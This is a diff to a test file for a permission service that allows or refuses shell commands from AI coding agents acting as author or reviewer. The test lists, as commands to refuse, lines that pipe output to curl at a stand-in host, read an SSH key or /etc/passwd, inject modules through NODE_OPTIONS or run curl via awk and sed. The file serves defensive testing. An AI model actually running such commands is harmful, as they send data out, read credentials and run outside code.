@@ -46,7 +46,7 @@ test('a second command after a newline or a single &, or one the first runs, is 
     'npm test &', 'ls\r\nwget x', 'find . -execdir sh -c x {} +', 'find . -ok rm {} ;', 'find . -delete',
     'cat <(curl http://x.io)', 'npm test > >(curl -d @- http://x.io)', 'node -e "fetch(1)"', 'node --eval x', 'node -p 1',
     'node --require ./x.js test/a.ts', 'node --import x test/a.ts', 'node test/a.ts', 'awk \'BEGIN{system("curl x")}\' f', 'sed -i "1e curl x" f', 'sed "1e id" f',
-    'NODE_OPTIONS=--require=./x.js npm test', 'PATH=/tmp/bin:$PATH npm test', 'npx tsc --noEmit', 'git -c core.pager=curl log',
+    'NODE_OPTIONS=--require=./x.js npm test', 'PATH=/tmp/bin:$PATH npm test', 'npx prettier --write .', 'npx tsc', 'git -c core.pager=curl log',
     'xargs curl < urls.txt', 'env curl x', 'timeout 5 curl x', 'nohup curl x', 'echo a; python3 -c 1',
     // The names the first rule denied anywhere, kept as a second check on the whole text.
     'echo "run: curl http://x.io"', 'grep -r wget src', 'npm run build -- --registry=x && npm install x',
@@ -153,7 +153,7 @@ test('a write outside the checkout, the network or an install keeps being refuse
       'npm test; curl http://x.io', 'npm test && git push origin main', 'npm run typecheck | curl -d @- http://x.io',
       // Run 5's first request of the reviewer: a check, then a file written outside the checkout.
       'git log --oneline origin/proof-run..HEAD; npm test 2>&1 | tail -8; cat > /tmp/t.mts <<\'E\'\nimport {findWords} from \'/workspace/src/words.ts\'\nE',
-    ]) assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'reject_once', rule: 'outside' }, `${role}: ${command}`);
+    ]) assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'reject_once', rule: 'refused' }, `${role}: ${command}`);
   }
   // A request that is not a command (an edit outside, a fetch) is denied.
   assert.deepEqual(permissionAnswer({ role: 'reviewer', command: undefined, checks }), { decision: 'reject_once', rule: 'not_a_command' });
@@ -162,7 +162,7 @@ test('a write outside the checkout, the network or an install keeps being refuse
 test('a role other than author or reviewer, or one the proof could not read, gets the checkout rule\'s answer', () => {
   for (const role of ['lead', 'reader', 'owner', '', undefined]) {
     assert.deepEqual(permissionAnswer({ role, command: 'npm test', checks }), { decision: 'allow_once', rule: 'checkout' }, String(role));
-    assert.deepEqual(permissionAnswer({ role, command: 'npm install x', checks }), { decision: 'reject_once', rule: 'outside' }, String(role));
+    assert.deepEqual(permissionAnswer({ role, command: 'npm install x', checks }), { decision: 'reject_once', rule: 'refused' }, String(role));
   }
   // The rule above is unchanged for the other proofs.
   assert.equal(answerFor('npm test'), 'allow_once');
@@ -179,4 +179,55 @@ test('everything but a declared check keeps the checkout rule\'s answer, run 5\'
   ]) {
     for (const role of ['reviewer', 'author', 'lead', undefined]) assert.equal(permissionAnswer({ role, command, checks }).decision, answerFor(command), `${role}: ${command}`);
   }
+});
+
+// The reviewer's requests the proof refused, as the ledger keeps them (run 5
+// and the runs before it): review 1 of PR 279, followup 1. Each is read by
+// the service's parser (parseList), never split as a string.
+const RUN5_REVIEWER_READS = 'npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; git ls-files; grep -rn "findWords\\|words:" --include=* -r src README.md | grep -v "^src/words.ts" | head';
+const RUN5_REVIEWER_SCRATCH = `git log --oneline origin/proof-run..HEAD; git diff origin/proof-run...HEAD --stat; npm test 2>&1 | tail -8; cat > /tmp/t.mts <<'E'
+import {findWords,parseWords} from '/workspace/src/words.ts';
+const l=parseWords('spam\\n');
+for (const t of ['spaḿ','spam​','xspaḿ spam']) console.log(JSON.stringify(t),findWords(l,t));
+E
+node /tmp/t.mts; git stash list; git show proof-run:src/words.ts >/dev/null 2>&1; git show origin/proof-run:src/words.ts | tail -8`;
+const EARLIER_REVIEWER_SCRATCH = `cd /tmp && cat > t.ts <<'E'
+import { findWords, parseWords } from '/workspace/src/words.ts';
+const l = parseWords('οδός\\nσ\\n');
+console.log(findWords(l,'ΟΔΟΣ'), findWords(parseWords('aς\\n'),'aΣ'));
+E
+node t.ts; cd /workspace; git diff origin/main...HEAD --stat | tail -2`;
+const EARLIER_REVIEWER_VARIABLE = 'echo "${DATABASE_URL:+set}"; npm run typecheck 2>&1 | tail -5; git diff main...HEAD -- test/consumer.test.ts | grep -n "^+.*it(\\|^+.*test(" ';
+
+test('the common forms of a check, read by the parser, are allowed once: run 5\'s reviewer reads among them (review 1 of PR 279, followup 1)', () => {
+  for (const command of [
+    RUN5_REVIEWER_READS,
+    // An author's of an earlier run: a quoted pattern holding | and parentheses.
+    'cd /workspace; npm test 2>&1 | grep -E "^ℹ (tests|pass|fail)"; npm run typecheck >/dev/null 2>&1 && echo typecheck ok; git status --short',
+    'cd services/api && npm test', 'cd /workspace/services/api && npm test 2>&1 | tail -20',
+    'npm test -- --test-name-pattern="filter API"', 'npm test -- -t "filter API" test/words.test.ts', 'npm run test -- --reporter=dot',
+    'npx tsc --noEmit', 'npx tsc --noEmit -p app', 'npx --no-install tsc --noEmit --pretty', 'npm run typecheck 2>&1 | tail -5 && npx tsc --noEmit -p app/web',
+    'git ls-files', 'git ls-files | wc -l', 'grep -rn "a\\|b" --include=*.ts src', 'ls *', 'wc -l *.md',
+  ]) assert.equal(answerFor(command), 'allow_once', command);
+});
+
+test('everything else stays refused: a scratch file outside the checkout, an expansion, a variable, an option that loads or writes elsewhere', () => {
+  for (const command of [
+    RUN5_REVIEWER_SCRATCH, EARLIER_REVIEWER_SCRATCH, EARLIER_REVIEWER_VARIABLE,
+    // Run 5's authors, refused before and still.
+    'FILTER_URL=http://filter-api:8795 npm test -- --test-name-pattern="filter API" 2>&1 | grep -E "integration|filter API|^ℹ|✖|Error|error" | head -30',
+    '(npm ls >/dev/null 2>&1 || npm ci >/dev/null 2>&1); npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; sed -n 95,125p src/server.ts',
+    'git cherry-pick -n f24fe1b && git diff --stat && npm test 2>&1 | tail -25', 'getent hosts filter-api postgres',
+    // cd: only into the checkout, never home (cd alone) nor back (cd -), nor up a glob.
+    'cd && cat .ssh/id_ed25519', 'cd - && ls', 'cd /tmp && npm test', 'cd .. && npm test', 'cd ".."* && ls', 'cat .*/x', 'ls src/*/../..',
+    // npm: its own options from a list, the runner's after -- too; nothing that loads a module or names a shell.
+    'npm test --script-shell=/bin/sh', 'npm test -- --require=./x.js', 'npm test -- --import=data:text/javascript,1', 'npm test -- -r ./x.js',
+    'npm ci -- x', 'npm run "a b"', 'npm test -- --test-reporter-destination=/tmp/out',
+    // npx: tsc alone, --noEmit required, its project inside.
+    'npx tsc', 'npx tsc --outDir /tmp/x', 'npx tsc --noEmit -p /etc', 'npx tsc --noEmit --plugin x', 'npx eslint .', 'npx -y tsc --noEmit',
+    // git: an output elsewhere, a write to the remote.
+    'git diff --output=/tmp/x', 'git log --output /tmp/x', 'git stash list', 'git push origin proof-run',
+    // What the parser refuses.
+    'npm test\nnpm run typecheck', 'npm test <<E\nx\nE', 'cat < /etc/passwd', 'echo "$HOME"', "echo 'a", 'npm test |& tail', 'ls {a,/etc}',
+  ]) assert.equal(answerFor(command), 'reject_once', JSON.stringify(command));
 });
